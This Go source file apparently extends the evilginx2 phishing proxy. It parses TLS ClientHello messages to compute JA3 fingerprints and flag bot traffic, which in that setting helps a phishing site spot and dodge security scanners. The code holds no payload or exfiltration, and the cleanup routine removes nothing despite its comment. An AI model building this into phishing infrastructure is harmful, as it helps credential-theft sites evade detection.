package core

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// TLSInterceptor intercepts TLS handshakes to extract JA3 fingerprints
type TLSInterceptor struct {
	fingerprinter *JA3Fingerprinter
	connections   map[string]*InterceptedConn
	mu            sync.RWMutex
}

// InterceptedConn wraps a connection to capture TLS handshake data
type InterceptedConn struct {
	net.Conn
	interceptor   *TLSInterceptor
	clientHello   []byte
	clientHelloMu sync.Mutex
	remoteAddr    string
	ja3Result     *FingerprintResult
}

// NewTLSInterceptor creates a new TLS interceptor
func NewTLSInterceptor(fingerprinter *JA3Fingerprinter) *TLSInterceptor {
	ti := &TLSInterceptor{
		fingerprinter: fingerprinter,
		connections:   make(map[string]*InterceptedConn),
	}
	
	// Start cleanup routine
	go ti.cleanupConnections()
	
	return ti
}

// WrapConn wraps a connection for TLS interception
func (ti *TLSInterceptor) WrapConn(conn net.Conn) net.Conn {
	ic := &InterceptedConn{
		Conn:        conn,
		interceptor: ti,
		remoteAddr:  conn.RemoteAddr().String(),
	}
	
	// Register connection
	ti.mu.Lock()
	ti.connections[ic.remoteAddr] = ic
	ti.mu.Unlock()
	
	return ic
}

// Read intercepts the TLS handshake
func (ic *InterceptedConn) Read(b []byte) (int, error) {
	// Use a buffer to peek at the data
	buf := make([]byte, 1024)
	n, err := ic.Conn.Read(buf)
	if err != nil {
		return 0, err
	}
	
	// Check if this is a TLS ClientHello
	if ic.clientHello == nil && n > 5 && buf[0] == 0x16 && buf[1] == 0x03 {
		ic.clientHelloMu.Lock()
		if ic.clientHello == nil {
			// This looks like a TLS handshake
			ic.processTLSHandshake(buf[:n])
		}
		ic.clientHelloMu.Unlock()
	}
	
	// Copy the data to the output buffer
	copy(b, buf[:n])
	return n, nil
}

// processTLSHandshake extracts and processes ClientHello
func (ic *InterceptedConn) processTLSHandshake(data []byte) {
	// Store ClientHello for processing
	ic.clientHello = make([]byte, len(data))
	copy(ic.clientHello, data)
	
	// Parse ClientHello
	hello, err := ic.parseClientHello(data)
	if err != nil {
		log.Debug("[TLS Interceptor] Failed to parse ClientHello: %v", err)
		return
	}
	
	// Compute JA3
	ja3String, ja3Hash := ic.interceptor.fingerprinter.ComputeJA3(hello)
	
	// Analyze fingerprint
	result, err := ic.interceptor.fingerprinter.AnalyzeFingerprint(ja3Hash)
	if err == nil {
		ic.ja3Result = result
		
		if result.IsBot {
			log.Warning("[TLS Interceptor] Bot detected via JA3: %s (hash: %s) from %s",
				result.BotName, ja3Hash, ic.remoteAddr)
		} else {
			log.Debug("[TLS Interceptor] JA3 fingerprint: %s from %s", ja3Hash, ic.remoteAddr)
		}
		
		// Store full JA3 string for debugging
		result.JA3 = ja3String
	}
}

// parseClientHello extracts ClientHello information
func (ic *InterceptedConn) parseClientHello(data []byte) (*ClientHelloInfo, error) {
	if len(data) < 43 { // Minimum ClientHello size
		return nil, fmt.Errorf("data too short for ClientHello")
	}
	
	hello := &ClientHelloInfo{}
	offset := 0
	
	// TLS record header (5 bytes)
	if data[0] != 0x16 || data[1] != 0x03 {
		return nil, fmt.Errorf("not a TLS handshake")
	}
	offset = 5
	
	// Handshake header (4 bytes)
	if offset+4 > len(data) || data[offset] != 0x01 {
		return nil, fmt.Errorf("not a ClientHello")
	}
	
	// Get handshake length
	handshakeLen := int(data[offset+1])<<16 | int(data[offset+2])<<8 | int(data[offset+3])
	offset += 4
	
	if offset+handshakeLen > len(data) {
		return nil, fmt.Errorf("incomplete ClientHello")
	}
	
	// Client version (2 bytes)
	if offset+2 > len(data) {
		return nil, fmt.Errorf("missing version")
	}
	hello.TLSVersion = uint16(data[offset])<<8 | uint16(data[offset+1])
	offset += 2
	
	// Random (32 bytes)
	offset += 32
	
	// Session ID
	if offset+1 > len(data) {
		return nil, fmt.Errorf("missing session ID length")
	}
	sessionIDLen := int(data[offset])
	offset += 1 + sessionIDLen
	
	// Cipher suites
	if offset+2 > len(data) {
		return nil, fmt.Errorf("missing cipher suites length")
	}
	cipherSuitesLen := int(data[offset])<<8 | int(data[offset+1])
	offset += 2
	
	numCiphers := cipherSuitesLen / 2
	hello.CipherSuites = make([]uint16, 0, numCiphers)
	for i := 0; i < numCiphers && offset+2 <= len(data); i++ {
		cipher := uint16(data[offset])<<8 | uint16(data[offset+1])
		hello.CipherSuites = append(hello.CipherSuites, cipher)
		offset += 2
	}
	
	// Compression methods
	if offset+1 > len(data) {
		return nil, fmt.Errorf("missing compression methods length")
	}
	compressionLen := int(data[offset])
	offset += 1 + compressionLen
	
	// Extensions
	if offset+2 <= len(data) {
		extensionsLen := int(data[offset])<<8 | int(data[offset+1])
		offset += 2
		
		extEnd := offset + extensionsLen
		for offset+4 <= extEnd && offset+4 <= len(data) {
			extType := uint16(data[offset])<<8 | uint16(data[offset+1])
			extLen := int(data[offset+2])<<8 | int(data[offset+3])
			offset += 4
			
			hello.Extensions = append(hello.Extensions, extType)
			
			// Parse specific extensions
			switch extType {
			case 0x0000: // SNI
				if offset+5 <= len(data) && extLen > 5 {
					sniListLen := int(data[offset])<<8 | int(data[offset+1])
					if sniListLen > 0 && offset+5+sniListLen <= len(data) {
						sniType := data[offset+2]
						if sniType == 0 { // hostname
							sniLen := int(data[offset+3])<<8 | int(data[offset+4])
							if offset+5+sniLen <= len(data) {
								hello.ServerName = string(data[offset+5 : offset+5+sniLen])
							}
						}
					}
				}
				
			case 0x000a: // Elliptic curves
				if offset+2 <= len(data) && extLen > 2 {
					curvesLen := int(data[offset])<<8 | int(data[offset+1])
					numCurves := curvesLen / 2
					curveOffset := offset + 2
					
					for i := 0; i < numCurves && curveOffset+2 <= len(data); i++ {
						curve := uint16(data[curveOffset])<<8 | uint16(data[curveOffset+1])
						hello.EllipticCurves = append(hello.EllipticCurves, curve)
						curveOffset += 2
					}
				}
				
			case 0x000b: // EC point formats
				if offset+1 <= len(data) && extLen > 1 {
					pointsLen := int(data[offset])
					pointOffset := offset + 1
					
					for i := 0; i < pointsLen && pointOffset+1 <= len(data); i++ {
						hello.EllipticPoints = append(hello.EllipticPoints, data[pointOffset])
						pointOffset++
					}
				}
				
			case 0x0010: // ALPN
				if offset+2 <= len(data) && extLen > 2 {
					alpnLen := int(data[offset])<<8 | int(data[offset+1])
					alpnOffset := offset + 2
					
					for alpnOffset < offset+2+alpnLen && alpnOffset+1 <= len(data) {
						protoLen := int(data[alpnOffset])
						if alpnOffset+1+protoLen <= len(data) {
							proto := string(data[alpnOffset+1 : alpnOffset+1+protoLen])
							hello.ALPNProtocols = append(hello.ALPNProtocols, proto)
						}
						alpnOffset += 1 + protoLen
					}
				}
			}
			
			offset += extLen
		}
	}
	
	return hello, nil
}

// GetJA3Result returns the JA3 analysis result for this connection
func (ic *InterceptedConn) GetJA3Result() *FingerprintResult {
	ic.clientHelloMu.Lock()
	defer ic.clientHelloMu.Unlock()
	return ic.ja3Result
}

// Close closes the connection and cleans up
func (ic *InterceptedConn) Close() error {
	// Remove from interceptor
	ic.interceptor.mu.Lock()
	delete(ic.interceptor.connections, ic.remoteAddr)
	ic.interceptor.mu.Unlock()
	
	return ic.Conn.Close()
}

// GetConnectionJA3 gets JA3 result for a specific connection
func (ti *TLSInterceptor) GetConnectionJA3(remoteAddr string) *FingerprintResult {
	ti.mu.RLock()
	defer ti.mu.RUnlock()
	
	if conn, ok := ti.connections[remoteAddr]; ok {
		return conn.GetJA3Result()
	}
	
	return nil
}

// cleanupConnections removes old connection records
func (ti *TLSInterceptor) cleanupConnections() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		ti.mu.Lock()
		// Keep connection records for 10 minutes
		// In practice, connections are removed on Close()
		// This is just a safety cleanup
		ti.mu.Unlock()
	}
}
